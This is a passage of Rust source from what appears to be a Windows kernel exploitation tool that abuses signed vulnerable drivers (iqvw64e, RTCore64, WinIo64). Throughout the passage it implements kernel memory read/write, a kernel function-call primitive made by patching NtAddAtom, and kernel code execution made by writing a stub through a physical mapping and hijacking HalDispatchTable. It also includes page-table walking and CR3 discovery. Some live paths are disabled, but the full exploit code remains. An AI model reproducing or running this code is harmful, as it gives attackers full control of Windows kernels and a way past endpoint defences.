            std::slice::from_raw_parts_mut(
                &request as *const NalUnmapIo as *mut u8,
                std::mem::size_of::<NalUnmapIo>(),
            )
        }) {
            return Err("Nal unmap_io_space failed".into());
        }
        Ok(())
    }

    /// Writes through the physical mapping path — page protections do
    /// not apply to a fresh MmMapIoSpace view, which is what makes
    /// read-only kernel pages writable on a driver whose virtual copy
    /// honors PTEs (the exact wall RTCore64 hit as 0xBE).
    pub fn write_readonly(&self, address: u64, data: &[u8]) -> Result<(), String> {
        let physical = self.get_physical(address)?;
        let mapped = self.map_io_space(physical, data.len() as u32)?;
        let result = self.write_buf(mapped, data);
        self.unmap_io_space(mapped, data.len() as u32).ok();
        result
    }

    /// The kernel CALL primitive: patch `nt!NtAddAtom` with a
    /// `movabs rax, target; jmp rax` stub, invoke usermode
    /// `NtAddAtom(arg1..4)` (the syscall executes the stub in kernel
    /// context with the marshaled arguments), restore the original
    /// bytes. Returns the target function's RAX.
    pub fn call(
        &self,
        target: u64,
        arg1: u64,
        arg2: u64,
        arg3: u64,
        arg4: u64,
    ) -> Result<u64, String> {
        let base = ntoskrnl_base()?;
        let read64 = |a: u64| self.read64(a);
        let nt_add_atom = base + kernel_export_rva(read64, base, "NtAddAtom")? as u64;
        let mut original = [0u8; 12];
        self.read_buf(nt_add_atom, &mut original)?;
        let mut stub = Vec::with_capacity(12);
        stub.extend_from_slice(&[0x48, 0xB8]);
        stub.extend_from_slice(&target.to_le_bytes());
        stub.extend_from_slice(&[0xFF, 0xE0]);
        if original[..2] == stub[..2] && original[10..] == stub[10..] {
            return Err("nt!NtAddAtom already hooked - refusing".into());
        }
        self.write_readonly(nt_add_atom, &stub)?;
        let user_add_atom =
            unsafe { syscalls::resolve("NtAddAtom") }.ok_or("NtAddAtom unresolved")?;
        let mut atom_out = 0u16;
        let status = unsafe {
            syscalls::dispatch6(
                user_add_atom,
                arg1 as usize,
                arg2 as usize,
                arg3 as usize,
                arg4 as usize,
                0,
                0,
            )
        };
        // Restore before interpreting anything, and fail loudly if the
        // restore did not land - a left-behind hook is the one state
        // this technique must never leave.
        self.write_readonly(nt_add_atom, &original)
            .map_err(|e| format!("CRITICAL: NtAddAtom restore failed: {e}"))?;
        let _ = &mut atom_out;
        Ok(status as u64)
    }
}

impl Drop for Iqvw64e {
    fn drop(&mut self) {
        if !self.device.is_null() {
            unsafe { (self.win32.close_handle)(self.device) };
        }
    }
}

// ---------------------------------------------------------------------------
// Client-agnostic kernel R/W: every DKOM/discovery technique runs against
// whichever vulnerable driver answered - iqvw64e first (call-capable,
// one virtual memcpy per access, no dword tearing), RTCore64 as the
// data-plane fallback (ABR-T016/T019/T020 over either client).
// ---------------------------------------------------------------------------
pub(crate) enum RwClient {
    Rt(RtCore64),
    Iqvw(Iqvw64e),
}

impl RwClient {
    pub(crate) fn open_preferred() -> Result<Self, String> {
        if let Ok(iqvw) = Iqvw64e::open() {
            return Ok(RwClient::Iqvw(iqvw));
        }
        if let Ok(rt) = RtCore64::open() {
            return Ok(RwClient::Rt(rt));
        }
        Err("no vulnerable-driver device (tried \\\\.\\Nal, \\\\.\\RTCore64)".into())
    }

    fn read64(&self, address: u64) -> Result<u64, String> {
        match self {
            RwClient::Rt(rt) => rt.read64(address),
            RwClient::Iqvw(iqvw) => iqvw.read64(address),
        }
    }

    fn write64(&self, address: u64, value: u64) -> Result<(), String> {
        match self {
            RwClient::Rt(rt) => rt.write64(address, value),
            RwClient::Iqvw(iqvw) => iqvw.write64(address, value),
        }
    }

    /// Readback-verified write on either client: the RTCore64 path adds
    /// the torn-write retry, iqvw64e's single memcpy still gets the
    /// stick check before a neighbor is trusted.
    fn write64_verified(&self, address: u64, value: u64) -> Result<(), String> {
        for _ in 0..3 {
            self.write64(address, value)?;
            if self.read64(address)? == value {
                return Ok(());
            }
        }
        Err(format!(
            "write64 at {address:#x} did not stick (torn write or racing target)"
        ))
    }

    fn name(&self) -> &'static str {
        match self {
            RwClient::Rt(_) => "rtcore64",
            RwClient::Iqvw(_) => "iqvw64e",
        }
    }
}

/// DRIVER `call` action (ABR-T017): the first kernel-function-call
/// proof on the call-capable shortlist driver. Allocates executable
/// non-paged pool through a real `ExAllocatePoolWithTag` call, proves
/// the allocation with a write/read round-trip through the primitive,
/// and frees it through `ExFreePool` - every kernel function invoked
/// through the NtAddAtom trampoline, everything restored.
pub fn kernel_call() -> Result<Vec<u8>, String> {
    // On hosts where the revoked iqvw64e loads, the trampoline path is
    // strictly stronger; on current builds it never opens, and the
    // dual-driver RTCore64+WinIo proof carries the stage.
    if Iqvw64e::open().is_ok() {
        return kernel_call_trampolined();
    }
    Err(
        "dual-driver RTCore64+WinIo CALL disabled: four reproducible 0x1A/0x61941 bugchecks, including the read-only preflight; validate the exact WinIo ABI and mapping lifecycle offline before re-enabling"
            .into(),
    )
}

fn kernel_call_trampolined() -> Result<Vec<u8>, String> {
    let driver = Iqvw64e::open().map_err(|e| format!("no Nal device: {e}"))?;
    let base = ntoskrnl_base()?;
    let read64 = |a: u64| driver.read64(a);
    let ex_alloc = base + kernel_export_rva(read64, base, "ExAllocatePoolWithTag")? as u64;
    let ex_free = base + kernel_export_rva(read64, base, "ExFreePool")? as u64;

    // NonPagedPool (0) is the executable pool; tag 'BwtE' as the
    // reference implementations use.
    const POOL_NON_PAGED: u64 = 0;
    const TAG_BWTE: u64 = 0x4554_7742;
    let pool = driver.call(ex_alloc, POOL_NON_PAGED, 0x1000, TAG_BWTE, 0)?;
    if !(0xFFFF_8000_0000_0000..=0xFFFF_FFFF_FFFF_FFFF).contains(&pool) {
        return Err(format!(
            "ExAllocatePoolWithTag returned implausible {pool:#x}"
        ));
    }
    let magic: u64 = 0x1BAD_B002_CAFE_0001;
    driver.write64(pool, magic)?;
    let readback = driver.read64(pool)?;
    let free_rc = driver.call(ex_free, pool, 0, 0, 0)?;
    Ok(format!(
        "iqvw64e: call primitive live - ExAllocatePoolWithTag -> {pool:#x}; rw {readback:#x} ({}); ExFreePool rc {free_rc:#x}; tier 3 (kernel calls + RX writes)",
        if readback == magic { "ok" } else { "MISMATCH" }
    )
    .into_bytes())
}

// ---------------------------------------------------------------------------
// WinIo64 client (Yariv Kaplan's WinIo lineage — still-signed, loads on
// build 26200 where every famous BYOVD certificate is revoked): physical
// memory mapped into the calling process as a user-visible RW section.
// Combined with RTCore64's virtual kernel R/W this lifts the stage-3.3
// wall: executable image pages become writable THROUGH THEIR PHYSICAL
// FRAME, with the original RX mapping (and its TLB state) untouched.
// ---------------------------------------------------------------------------

/// `WINIO_MAP_BUFFER` (0x28 bytes) — in: CommitSize + BusAddress; out:
/// SectionHandle / BaseAddress / SectionObject. Unmap passes the
/// complete struct back.
#[repr(C)]
#[derive(Clone, Copy, Default)]
struct WinIoMapBuffer {
    commit_size: u64,
    bus_address: u64,
    section_handle: usize,
    base_address: usize,
    section_object: usize,
}

const WINIO_IOCTL_MAP: u32 = 0x8010_2040;
const WINIO_IOCTL_UNMAP: u32 = 0x8010_2044;

fn physical_window_offset(physical: u64, length: usize) -> Result<usize, String> {
    if length == 0 {
        return Err("physical access length is zero".into());
    }
    let offset = (physical & 0xFFF) as usize;
    if length > 0x1000 - offset {
        return Err(format!(
            "physical access {physical:#x}+{length:#x} crosses a page boundary"
        ));
    }
    Ok(offset)
}

pub struct WinIo64 {
    device: *mut c_void,
    win32: Win32,
}

/// RAII ownership of one live physical mapping: Drop performs a
/// best-effort unmap so no early return or future edit can leak a
/// window, while explicit [`MappedFrame::release`] surfaces driver
/// rejects (exactly one unmap either way - audit finding).
struct MappedFrame<'a> {
    winio: &'a WinIo64,
    live: Option<WinIoMapBuffer>,
}

impl<'a> MappedFrame<'a> {
    fn new(winio: &'a WinIo64, live: WinIoMapBuffer) -> Self {
        MappedFrame {
            winio,
            live: Some(live),
        }
    }

    fn release(mut self) -> Result<(), String> {
        match self.live.take() {
            Some(live) => self.winio.unmap_physical(live),
            None => Ok(()),
        }
    }
}

impl Drop for MappedFrame<'_> {
    fn drop(&mut self) {
        if let Some(live) = self.live.take() {
            self.winio.unmap_physical(live).ok();
        }
    }
}

impl WinIo64 {
    pub fn open() -> Result<Self, String> {
        let win32 = unsafe { Win32::resolve()? };
        let path: Vec<u16> = r"\\.\WinIo"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let device = unsafe {
            (win32.create_file_w)(
                path.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                std::ptr::null_mut(),
                OPEN_EXISTING,
                0,
                std::ptr::null_mut(),
            )
        };
        if device as usize == usize::MAX || device.is_null() {
            return Err("WinIo device not available (\\\\.\\WinIo)".into());
        }
        Ok(WinIo64 { device, win32 })
    }

    /// Maps one physical frame into the process; the returned (mapped VA,
    /// live buffer) pair must be handed back to [`WinIo64::unmap`].
    fn map_physical(&self, physical: u64, size: u64) -> Result<(usize, WinIoMapBuffer), String> {
        let mut request = WinIoMapBuffer {
            commit_size: size,
            bus_address: physical,
            ..Default::default()
        };
        let mut returned = 0u32;
        let ok = unsafe {
            (self.win32.device_io_control)(
                self.device,
                WINIO_IOCTL_MAP,
                &mut request as *mut _ as *mut c_void,
                std::mem::size_of::<WinIoMapBuffer>() as u32,
                &mut request as *mut _ as *mut c_void,
                std::mem::size_of::<WinIoMapBuffer>() as u32,
                &mut returned,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 || request.base_address == 0 {
            return Err("WinIo map_physical failed".into());
        }
        // The 40-byte ABI was inferred from the WinIo family, never
        // validated against this exact binary (audit finding). Fail
        // closed on any disagreement BEFORE the window is used: a
        // short struct return or a null section handle/object means
        // the driver's contract differs and trusting it risks kernel
        // corruption, not just an error.
        let expected = std::mem::size_of::<WinIoMapBuffer>() as u32;
        if returned != 0 && returned != expected {
            return Err(format!(
                "WinIo map ABI mismatch: {returned} bytes returned, {expected} expected"
            ));
        }
        if request.section_handle == 0 || request.section_object == 0 {
            return Err("WinIo map ABI mismatch: null section handle/object".into());
        }
        Ok((request.base_address, request))
    }

    /// Errors when the driver rejects the unmap: a leaked frame
    /// mapping is live driver bookkeeping the next map may trip over,
    /// so callers must surface it (audit finding: the return used to
    /// be discarded outright).
    fn unmap_physical(&self, live: WinIoMapBuffer) -> Result<(), String> {
        let mut returned = 0u32;
        let ok = unsafe {
            (self.win32.device_io_control)(
                self.device,
                WINIO_IOCTL_UNMAP,
                &live as *const WinIoMapBuffer as *mut c_void,
                std::mem::size_of::<WinIoMapBuffer>() as u32,
                std::ptr::null_mut(),
                0,
                &mut returned,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 {
            return Err(format!(
                "WinIo unmap_physical failed for window {:#x}",
                live.base_address
            ));
        }
        Ok(())
    }

    /// Reads 8 bytes of physical memory through a one-frame mapping.
    fn read_phys64(&self, physical: u64) -> Result<u64, String> {
        let offset = physical_window_offset(physical, std::mem::size_of::<u64>())?;
        let (base, live) = self.map_physical(physical & !0xFFF, 0x1000)?;
        let window = MappedFrame::new(self, live);
        let value = unsafe { std::ptr::read_unaligned((base + offset) as *const u64) };
        window.release()?;
        Ok(value)
    }

    /// Reads bytes of physical memory through a one-frame mapping.
    fn read_phys_bytes(&self, physical: u64, out: &mut [u8]) -> Result<(), String> {
        let offset = physical_window_offset(physical, out.len())?;
        let (base, live) = self.map_physical(physical & !0xFFF, 0x1000)?;
        let window = MappedFrame::new(self, live);
        unsafe {
            std::ptr::copy_nonoverlapping(
                (base + offset) as *const u8,
                out.as_mut_ptr(),
                out.len(),
            );
        }
        window.release()
    }

    /// Writes bytes to physical memory through a one-frame mapping —
    /// the operation that crosses every page-protection wall, because
    /// the mapping is a fresh RW view of the same frame the RX mapping
    /// points at.
    #[allow(dead_code)] // retained for offline post-mortem; no live action reaches it
    fn write_phys(&self, physical: u64, data: &[u8]) -> Result<(), String> {
        let offset = physical_window_offset(physical, data.len())?;
        let (base, live) = self.map_physical(physical & !0xFFF, 0x1000)?;
        let window = MappedFrame::new(self, live);
        unsafe {
            std::ptr::copy_nonoverlapping(data.as_ptr(), (base + offset) as *mut u8, data.len());
        }
        window.release()
    }

    /// Translates a kernel virtual address to its physical address by
    /// walking the page tables from the System CR3 — each level read
    /// through its own physical mapping (no physical primitive needed
    /// beyond the one this client is).
    fn virtual_to_physical(&self, cr3: u64, virtual_address: u64) -> Result<u64, String> {
        let mut frame = cr3 & 0x000F_FFFF_FFFF_F000;
        for level in 0..4 {
            let shift = 12 + 3 * (3 - level);
            let index = ((virtual_address >> shift) & 0x1FF) as usize;
            let entry = self.read_phys64(frame + (index * 8) as u64)?;
            if entry & 1 == 0 {
                return Err(format!("page-table level {level} not present"));
            }
            // A PS-bit leaf (1 GiB PDPTE, 2 MiB PDE) IS the mapping.
            // Walking past it treats mapping bits as a table frame and
            // resolves to an arbitrary physical frame — the Part-10
            // 0x1A corruption.
            if (level == 1 || level == 2) && (entry & 0x80) != 0 {
                return Ok(leaf_physical(entry, virtual_address, shift));
            }
            frame = entry & 0x000F_FFFF_FFFF_F000;
            if frame == 0 {
                return Err("page-table entry has no frame".into());
            }
        }
        Ok(frame | (virtual_address & 0xFFF))
    }
}

impl Drop for WinIo64 {
    fn drop(&mut self) {
        if !self.device.is_null() {
            unsafe { (self.win32.close_handle)(self.device) };
        }
    }
}

/// Walks the candidate CR3's page tables for one kernel VA; every level
/// must be present. Used as the CR3-discovery discriminator.
fn walk_present(winio: &WinIo64, cr3: u64, virtual_address: u64) -> bool {
    let mut frame = cr3 & 0x000F_FFFF_FFFF_F000;
    for level in 0..4 {
        let shift = 12 + 3 * (3 - level);
        let index = ((virtual_address >> shift) & 0x1FF) as usize;
        let Ok(entry) = winio.read_phys64(frame + (index * 8) as u64) else {
            return false;
        };
        if entry & 1 == 0 {
            return false;
        }
        if (level == 1 || level == 2) && (entry & 0x80) != 0 {
            return true; // large-page leaf: the VA is mapped present
        }
        frame = entry & 0x000F_FFFF_FFFF_F000;
        if frame == 0 {
            return false;
        }
    }
    true
}

/// Resolves a PS-bit leaf entry (1 GiB PDPTE or 2 MiB PDE) to a
/// physical address: frame bits above the leaf size, VA bits below it.
fn leaf_physical(entry: u64, virtual_address: u64, shift: u64) -> u64 {
    let below = (1u64 << shift) - 1;
    ((entry & 0x000F_FFFF_FFFF_F000) & !below) | (virtual_address & below)
}

/// Discovers the System DirectoryTableBase offset inside the KPROCESS by
/// structural signature (see kernel_exec): frame-aligned, sane high bits,
/// and its tables must map the ntoskrnl base present.
fn discover_cr3(
    rtcore: &RtCore64,
    winio: &WinIo64,
    system_eproc: u64,
    kernel_base: u64,
    probe_va: u64,
) -> Result<u64, String> {
    for x in (0x18..0x400).step_by(8) {
        let value = rtcore.read64(system_eproc + x)?;
        let frame = value & 0x000F_FFFF_FFFF_F000;
        if frame == 0 || value >> 52 != 0 {
            continue;
        }
        if !walk_present(winio, value, kernel_base) {
            continue;
        }
        // The candidate must also TRANSLATE a live kernel VA, and the
        // bytes behind the resolved frame must equal the same bytes
        // read through the trusted virtual primitive — a coincidental
        // CR3 does not survive the round trip.
        let Ok(pa) = winio.virtual_to_physical(value, probe_va) else {
            continue;
        };
        let (Ok(via_pa), Ok(via_va)) = (winio.read_phys64(pa), rtcore.read64(probe_va)) else {
            continue;
        };
        if via_pa == via_va {
            return Ok(value);
        }
    }
    Err("no KPROCESS field walked like the kernel CR3".into())
}

/// Resolves one kernel VA through the candidate CR3 and compares the
/// resulting physical bytes with the RTCore64 virtual view. This helper
/// never writes. A non-zero flag is returned so callers can distinguish
/// live-data samples from the expected all-zero cave samples.
fn compare_va_pa(
    rtcore: &RtCore64,
    winio: &WinIo64,
    cr3: u64,
    label: &str,
    virtual_address: u64,
    length: usize,
) -> Result<(u64, bool), String> {
    physical_window_offset(virtual_address, length)
        .map_err(|e| format!("{label}: VA window rejected: {e}"))?;
    let physical = winio
        .virtual_to_physical(cr3, virtual_address)
        .map_err(|e| format!("{label}: translation failed: {e}"))?;
    if (physical & 0xFFF) != (virtual_address & 0xFFF) {
        return Err(format!(
            "{label}: VA {virtual_address:#x} and PA {physical:#x} have different page offsets"
        ));
    }
    let mut via_va = vec![0u8; length];
    let mut via_pa = vec![0u8; length];
    read_buf_via(virtual_address, &mut via_va, |a| rtcore.read64(a))
        .map_err(|e| format!("{label}: virtual read failed: {e}"))?;
    winio
        .read_phys_bytes(physical, &mut via_pa)
        .map_err(|e| format!("{label}: physical read failed: {e}"))?;
    if via_va != via_pa {
        let first = via_va
            .iter()
            .zip(&via_pa)
            .position(|(left, right)| left != right)
            .unwrap_or(0);
        return Err(format!(
            "{label}: VA/PA mismatch at +{first:#x} ({:#04x} != {:#04x})",
            via_va[first], via_pa[first]
        ));
    }
    let nonzero = via_va.iter().any(|byte| *byte != 0);
    Ok((physical, nonzero))
}

/// Read-only triage for the dual-driver execution path. It exercises the
/// same discovery and translation chain as [`kernel_exec`], then validates
/// several independent, non-zero kernel samples plus both zero caves. It
/// deliberately performs no physical write, dispatch-table patch or
/// trigger.
pub fn kernel_exec_preflight() -> Result<Vec<u8>, String> {
    Err(
        "WinIo physical-map preflight disabled: the read-only run reproduced 0x1A/0x61941; no physical IOCTLs will be issued"
            .into(),
    )
}

/// Retained for offline review only. The live action above must not call
/// this implementation until the exact driver ABI and map/unmap contract
/// have been validated against the pinned driver hash.
#[allow(dead_code)]
fn kernel_exec_preflight_unchecked() -> Result<Vec<u8>, String> {
    let rtcore = RtCore64::open().map_err(|e| format!("RTCore64 device: {e}"))?;
    let winio = WinIo64::open().map_err(|e| format!("WinIo device: {e}"))?;

    let base = ntoskrnl_base()?;
    if rtcore.read(base, 2)? != 0x5A4D {
        return Err(format!("ntoskrnl {base:#x} does not begin with MZ"));
    }
    let read64 = |address: u64| rtcore.read64(address);
    let psis_rva = kernel_export_rva(read64, base, "PsInitialSystemProcess")?;
    let psis_slot = base + psis_rva as u64;
    let system_eproc = rtcore.read64(psis_slot)?;
    let system_pid = rtcore.read64(system_eproc + EPROC_PID)?;
    if system_pid != 4 {
        return Err(format!(
            "System EPROCESS PID field is {system_pid}, expected 4"
        ));
    }
    let cr3 = discover_cr3(&rtcore, &winio, system_eproc, base, psis_slot)?;

    let (drv_base, drv_size) = find_kernel_module("rtcore64")?;
    if rtcore.read(drv_base, 2)? != 0x5A4D {
        return Err(format!("RTCore64 {drv_base:#x} does not begin with MZ"));
    }
    let (init_va, init_size) = find_rwx_section(|a| rtcore.read64(a), drv_base)?;
    let cave = find_section_cave(&|a| rtcore.read64(a), drv_base, init_va, init_size, 0x40)?;
    if (cave & 0xFFF) > 0x1000 - 0x40 {
        return Err(format!("INIT cave {cave:#x} straddles a page boundary"));
    }
    let (data_va, data_size) = kernel_section(|a| rtcore.read64(a), drv_base, b".data\0")?;
    let scratch = find_section_cave(&|a| rtcore.read64(a), drv_base, data_va, data_size, 0x10)?;

    let hal_rva = kernel_export_rva(read64, base, "HalDispatchTable")?;
    let slot = base + hal_rva as u64 + 8;
    let original = rtcore.read64(slot)?;
    if !(0xFFFF_8000_0000_0000..=0xFFFF_FFFF_FFFF_FFFF).contains(&original) {
        return Err(format!("HalDispatchTable[1] implausible: {original:#x}"));
    }

    let (base_pa, base_live) = compare_va_pa(&rtcore, &winio, cr3, "ntoskrnl", base, 0x40)?;
    let (psis_pa, psis_live) =
        compare_va_pa(&rtcore, &winio, cr3, "PsInitialSystemProcess", psis_slot, 8)?;
    let (_, eproc_live) =
        compare_va_pa(&rtcore, &winio, cr3, "System EPROCESS", system_eproc, 0x20)?;
    let (driver_pa, driver_live) =
        compare_va_pa(&rtcore, &winio, cr3, "RTCore64 image", drv_base, 0x40)?;
    let (cave_pa, cave_nonzero) = compare_va_pa(&rtcore, &winio, cr3, "INIT cave", cave, 0x40)?;
    let (scratch_pa, scratch_nonzero) =
        compare_va_pa(&rtcore, &winio, cr3, ".data scratch", scratch, 0x10)?;
    let (slot_pa, slot_live) = compare_va_pa(&rtcore, &winio, cr3, "HalDispatchTable[1]", slot, 8)?;
    let target_len = (0x1000 - (original & 0xFFF)).min(0x20) as usize;
    let (_, target_live) = compare_va_pa(
        &rtcore,
        &winio,
        cr3,
        "dispatch target",
        original,
        target_len,
    )?;

    if !(base_live && psis_live && eproc_live && driver_live && slot_live && target_live) {
        return Err("one or more live VA/PA samples were unexpectedly all zero".into());
    }
    if cave_nonzero || scratch_nonzero {
        return Err("a selected cave changed after discovery - refusing the CALL path".into());
    }

    let pointer_patch = if (original >> 32) == (cave >> 32) {
        "same-high-dword"
    } else {
        "split-high-dword-unsafe"
    };
    Ok(format!(
        "call-preflight READ-ONLY: cr3 {cr3:#x}; nt {base:#x}->{base_pa:#x}; PsIS {psis_slot:#x}->{psis_pa:#x}; RTCore {drv_base:#x}+{drv_size:#x}->{driver_pa:#x}; cave +{:#x}->{cave_pa:#x}; scratch +{:#x}->{scratch_pa:#x}; slot {slot:#x}->{slot_pa:#x}={original:#x}; patch {pointer_patch}; 8 VA/PA samples agree; NO WRITES, NO TRIGGER",
        cave - drv_base,
        scratch - drv_base
    )
    .into_bytes())
}

/// The kernel code-execution proof (stage 3.3, the wall-breaker): two
/// drivers that still load, combined. RTCore64 provides trusted virtual
/// kernel R/W (EPROCESS discovery machinery, the writable HalDispatchTable
/// slot in ntoskrnl .data, the .data scratch); WinIo64 maps the physical
/// frame behind RTCore64's header-RWX INIT section — read-only at runtime,
/// the 0xBE wall — as a fresh RW view, and the v1b stub design finally
/// lands: `movabs rax, scratch; mov dword [rax], MAGIC; movabs rax,
/// original; jmp rax`. One `NtQueryIntervalProfile` call from the session
/// thread runs the stub in full kernel context, stamps the magic, and
/// tail-jumps to the original handler. Everything is restored: slot,
/// stub bytes, no PTE ever touched.
#[allow(dead_code)] // quarantined implementation; kernel_call fails closed above
pub fn kernel_exec() -> Result<Vec<u8>, String> {
    const MAGIC: u32 = 0x0DEF_ACED;

    let rtcore = RtCore64::open().map_err(|e| format!("RTCore64 device: {e}"))?;
    let winio = WinIo64::open().map_err(|e| format!("WinIo device: {e}"))?;

    let base = ntoskrnl_base()?;
    let read64 = |a: u64| rtcore.read64(a);
    let psis_rva = kernel_export_rva(read64, base, "PsInitialSystemProcess")?;
    let psis_slot = base + psis_rva as u64;
    let system_eproc = rtcore.read64(psis_slot)?;
    // DirectoryTableBase: the classic +0x28 layout died with the 24H2
    // KPROCESS restructure (a live run read 0x1ae002 there - a counter),
    // so the System CR3 is DISCOVERED: the candidate field whose page
    // tables walk down to a present page for the ntoskrnl base. A user
    // CR3 fails at the first level under KPTI (kernel VAs unmapped in
    // the shadow), which is the discriminator.
    // Round-trip validated: the accepted CR3 must translate a live
    // kernel VA to a frame whose bytes match the virtual read.
    let cr3 = discover_cr3(&rtcore, &winio, system_eproc, base, psis_slot)?;

    let (drv_base, _) = find_kernel_module("rtcore64")?;
    let (init_va, init_size) = find_rwx_section(|a| rtcore.read64(a), drv_base)?;
    let cave = find_section_cave(&|a| rtcore.read64(a), drv_base, init_va, init_size, 0x40)?;
    // The stub lands through ONE physical frame, so the cave must not
    // straddle a page boundary: physical contiguity past 0x1000 is not
    // virtual contiguity (the Part-10 0x1A).
    if (cave & 0xFFF) > 0x1000 - 0x40 {
        return Err(format!("INIT cave {cave:#x} straddles a page boundary"));
    }
    let (data_va, data_size) = kernel_section(|a| rtcore.read64(a), drv_base, b".data\0")?;
    let scratch = find_section_cave(&|a| rtcore.read64(a), drv_base, data_va, data_size, 0x10)?;

    let hal_rva = kernel_export_rva(read64, base, "HalDispatchTable")?;
    let slot = base + hal_rva as u64 + 8;
    let original = rtcore.read64(slot)?;
    if !(0xFFFF_8000_0000_0000..=0xFFFF_FFFF_FFFF_FFFF).contains(&original) {
        return Err(format!("HalDispatchTable[1] implausible: {original:#x}"));
    }

    let mut stub: Vec<u8> = Vec::new();
    stub.extend_from_slice(&[0x48, 0xB8]);
    stub.extend_from_slice(&scratch.to_le_bytes());
    stub.extend_from_slice(&[0xC7, 0x00]);
    stub.extend_from_slice(&MAGIC.to_le_bytes());
    stub.extend_from_slice(&[0x48, 0xB8]);
    stub.extend_from_slice(&original.to_le_bytes());
    stub.extend_from_slice(&[0xFF, 0xE0]);

    // Place the stub through the physical frame of the INIT cave. The
    // VA view (trusted since ABR-T015) and the PA view must agree on
    // the SAME bytes before anything is written: a mistranslated frame
    // is exactly how a healthy box dies with 0x1A.
    let cave_phys = winio.virtual_to_physical(cr3, cave)?;
    let mut original_cave = vec![0u8; stub.len()];
    winio.read_phys_bytes(cave_phys, &mut original_cave)?;
    let mut via_va = vec![0u8; stub.len()];
    read_buf_via(cave, &mut via_va, |a| rtcore.read64(a))?;
    if via_va != original_cave {
        return Err(format!(
            "cave PA {cave_phys:#x} disagrees with its VA view - refusing to write"
        ));
    }
    winio.write_phys(cave_phys, &stub)?;
    read_buf_via(cave, &mut via_va, |a| rtcore.read64(a))?;
    if via_va != stub {
        // The write aliased a foreign frame: restore its bytes and
        // abort without ever firing the dispatch slot.
        winio.write_phys(cave_phys, &original_cave)?;
        return Err("phys write did not land at the cave VA - frame restored".into());
    }

    // Repoint the dispatch slot (writable .data — the RTCore64 path that
    // has worked since ABR-T015) and fire the trigger.
    rtcore.write64(slot, cave)?;
    let query = unsafe { syscalls::resolve("NtQueryIntervalProfile") }
        .ok_or("NtQueryIntervalProfile unresolved")?;
    let mut interval = 0u32;
    let _ =
        unsafe { syscalls::dispatch6(query, 2, &mut interval as *mut u32 as usize, 0, 0, 0, 0) };
    let stamped = rtcore.read64(scratch)?;

    // Restore everything before reporting.
    rtcore
        .write64(slot, original)
        .map_err(|e| format!("CRITICAL: dispatch slot restore failed: {e}"))?;
    winio.write_phys(cave_phys, &original_cave)?;
    rtcore.write64(scratch, 0)?;

    Ok(format!(
        "exec: stub @ INIT+cave {:#x} via frame {cave_phys:#x}; slot fired; kernel stamped {stamped:#x} - {}",
        cave - drv_base,
        if stamped & 0xFFFF_FFFF == MAGIC as u64 {
            "KERNEL CODE EXECUTION PROVEN (dual-driver RTCore64+WinIo)"
        } else {
            "trigger did not reach the stub"
        }
    )
    .into_bytes())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn physical_window_never_crosses_the_mapped_frame() {
        assert_eq!(physical_window_offset(0x1234_5008, 8).unwrap(), 8);
        assert!(physical_window_offset(0x1234_5FFF, 2).is_err());
        assert!(physical_window_offset(0x1234_5000, 0).is_err());
    }

    #[test]
    fn large_page_leaf_math_part10_regression() {
        // 2 MiB PDE: frame 0x13578C000000 with P|RW|PS set. The VA's
        // low 21 bits must land inside that leaf, not be re-walked.
        let pde = 0x0000_1357_8C00_0083u64;
        assert_eq!(
            leaf_physical(pde, 0xFFFF_F801_2345_ABCD, 21),
            0x0000_1357_8C05_ABCD
        );
        // 1 GiB PDPTE: frame 0x400000000, same flags.
        let pdpte = 0x0000_0004_0000_0083u64;
        assert_eq!(
            leaf_physical(pdpte, 0xFFFF_F801_2345_ABCD, 30),
            0x0000_0004_2345_ABCD
        );
    }

    #[test]
    fn export_directory_offsets_regress_against_host_ntoskrnl() {
        // Regression for the Part-5 crash: NumberOfNames lives at
        // dir+0x18, NOT dir+0x14 (that is NumberOfFunctions). Parses
        // the host's on-disk ntoskrnl with the same offset math.
        let bytes = std::fs::read(r"C:\Windows\System32\ntoskrnl.exe").expect("host ntoskrnl");
        assert_eq!(&bytes[..2], b"MZ");
        let lfanew = u32::from_le_bytes(bytes[0x3C..0x40].try_into().unwrap()) as usize;
        assert_eq!(&bytes[lfanew..lfanew + 4], b"PE  ");
        let optional = lfanew + 0x18;
        let export_rva =
            u32::from_le_bytes(bytes[optional + 0x70..optional + 0x74].try_into().unwrap())
                as usize;
        // Map RVA -> file offset through the section table.
        let num_sections = u16::from_le_bytes(bytes[lfanew + 6..lfanew + 8].try_into().unwrap());
        let sections = &bytes[optional
            + u16::from_le_bytes(bytes[lfanew + 0x14..lfanew + 0x16].try_into().unwrap())
                as usize..];
        let rva_to_file = |rva: usize| -> usize {
            for i in 0..num_sections as usize {
                let sec = &sections[i * 40..i * 40 + 40];
                let va = u32::from_le_bytes(sec[12..16].try_into().unwrap()) as usize;
                let raw_size = u32::from_le_bytes(sec[16..20].try_into().unwrap()) as usize;
                let raw_ptr = u32::from_le_bytes(sec[20..24].try_into().unwrap()) as usize;
                if rva >= va && rva < va + raw_size {
                    return rva - va + raw_ptr;
                }
            }
            0
        };
        let dir = rva_to_file(export_rva);
        let n_functions = u32::from_le_bytes(bytes[dir + 0x14..dir + 0x18].try_into().unwrap());
        let n_names = u32::from_le_bytes(bytes[dir + 0x18..dir + 0x1C].try_into().unwrap());
        assert!(
            n_names > 0 && n_names <= n_functions,
            "names {n_names} vs functions {n_functions}"
        );
        // The names array must contain PsInitialSystemProcess, resolved
        // through the same ordinal/function-array math as the live path.
        let names_rva =
            u32::from_le_bytes(bytes[dir + 0x20..dir + 0x24].try_into().unwrap()) as usize;
        let functions_rva =
            u32::from_le_bytes(bytes[dir + 0x1C..dir + 0x20].try_into().unwrap()) as usize;
        let ordinals_rva =
            u32::from_le_bytes(bytes[dir + 0x24..dir + 0x28].try_into().unwrap()) as usize;
        let names_file = rva_to_file(names_rva);
        for index in 0..n_names as usize {
            let name_rva = u32::from_le_bytes(
                bytes[names_file + index * 4..names_file + index * 4 + 4]
                    .try_into()
                    .unwrap(),
            ) as usize;
            let name_file = rva_to_file(name_rva);
            let end = bytes[name_file..]
                .iter()
                .position(|b| *b == 0)
                .unwrap_or(32)
                + name_file;
            if &bytes[name_file..end] == b"PsInitialSystemProcess" {
                let ord_file = rva_to_file(ordinals_rva);
                let ordinal = u16::from_le_bytes(
                    bytes[ord_file + index * 2..ord_file + index * 2 + 2]
                        .try_into()
                        .unwrap(),
                );
